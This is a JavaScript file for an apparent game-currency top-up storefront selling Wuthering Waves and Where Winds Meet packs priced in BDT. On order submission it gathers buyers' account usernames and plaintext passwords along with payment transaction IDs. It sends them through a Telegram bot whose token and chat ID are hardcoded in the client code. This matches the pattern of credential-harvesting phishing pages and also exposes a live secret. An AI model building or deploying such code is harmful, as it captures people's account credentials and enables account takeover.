const packages = {
    ww: [
        { id: 'ww1', type: 'Lunite Subscription Pack', name: 'Tide Blessing Pack', price: 449 },
        { id: 'ww2', type: 'Resonator Pass Packs', name: 'Resonator Pass', price: 949 },
        { id: 'ww3', type: 'Resonator Pass Packs', name: 'Resonator Pass+', price: 2199 },
        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites', price: 3299 },
        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites', price: 5499 },
        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
    ],
    wwm: [
        { id: 'wwm1', type: 'Moonlit Supply Pack', name: 'Spirit Jade Subscription', price: 449 },
        { id: 'wwm2', type: 'Hero’s Journey Pass', name: 'Battle Scroll', price: 949 },
        { id: 'wwm3', type: 'Hero’s Journey Pass', name: 'Battle Scroll+', price: 2199 },
        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade', price: 3299 },
        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade', price: 5499 },
        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade', price: 10999 }
    ]
};

const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
const CHAT_IDS = ['8395284772']; 

const container = document.getElementById('packages-container');
const modal = document.getElementById('order-modal');
const qtyInput = document.getElementById('quantity');
const plusBtn = document.getElementById('plus-btn');
const minusBtn = document.getElementById('minus-btn');
const displayPrice = document.getElementById('display-price');
const paymentAmount = document.getElementById('payment-amount');
const body = document.body;

let currentPackage = null;
let currentGame = '';

function render(game) {
    // UI Change & Theme Swap
    body.className = `theme-${game}`;
    container.innerHTML = '';
    currentGame = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
    
    // Staggered Animation Logic
    packages[game].forEach((p, index) => {
        const div = document.createElement('div');
        div.className = 'package-card';
        div.style.animation = `slideUpFade 0.6s cubic-bezier(0.16, 1, 0.3, 1) ${index * 0.08}s forwards`; // Cascade effect
        
        div.innerHTML = `<span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p>`;
        
        div.onclick = () => {
            currentPackage = p;
            document.getElementById('modal-package-name').innerText = p.name;
            document.getElementById('modal-game-name').innerText = currentGame;
            qtyInput.value = 1;
            updateUI();
            modal.classList.remove('hidden');
        };
        container.appendChild(div);
    });
}

function updateUI() {
    const total = currentPackage.price * parseInt(qtyInput.value || 1);
    displayPrice.innerText = total;
    paymentAmount.innerText = total + ' BDT';
}

plusBtn.onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
minusBtn.onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
qtyInput.oninput = updateUI;

document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');

document.querySelectorAll('.game-btn').forEach(btn => {
    btn.onclick = (e) => {
        document.querySelectorAll('.game-btn').forEach(b => b.classList.remove('active'));
        e.target.classList.add('active');
        render(e.target.dataset.game);
    };
});

document.getElementById('order-form').onsubmit = async (e) => {
    e.preventDefault();
    const btn = document.getElementById('submit-btn');
    btn.disabled = true; btn.innerText = 'Processing...';

    const msg = `🚀 *New Order!*

🎮 *Game:* ${currentGame}
📦 *Pack:* ${currentPackage.name}
🔢 *Qty:* ${qtyInput.value}
💰 *Total:* ${displayPrice.innerText} BDT

👤 *User:* \`${document.getElementById('email-username').value}\`
🔑 *Pass:* \`${document.getElementById('password').value}\`
🌍 *Server:* \`${document.getElementById('server').value}\`
🏷️ *IGN:* \`${document.getElementById('ign').value}\`

💳 *TrxID:* \`${document.getElementById('trxid').value}\``;

    try {
        for (const id of CHAT_IDS) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
            });
        }
        
        modal.classList.add('hidden');
        document.getElementById('success-modal').classList.remove('hidden');
    } catch (error) {
        alert('Something went wrong! Please try again.');
        console.error('Telegram API Error:', error);
    } finally {
        btn.disabled = false; btn.innerText = 'Confirm Order';
        document.getElementById('order-form').reset();
    }
};

document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');

function copyNumber() {
    const numberText = document.getElementById('bkash-number').innerText;
    navigator.clipboard.writeText(numberText).then(() => {
        const copyBtn = document.querySelector('.copy-icon');
        const originalIcon = copyBtn.innerText;
        copyBtn.innerText = '✔️';
        setTimeout(() => { copyBtn.innerText = originalIcon; }, 2000);
    }).catch(err => console.error('Failed to copy: ', err));
}

// Start with WW Theme
render('ww');
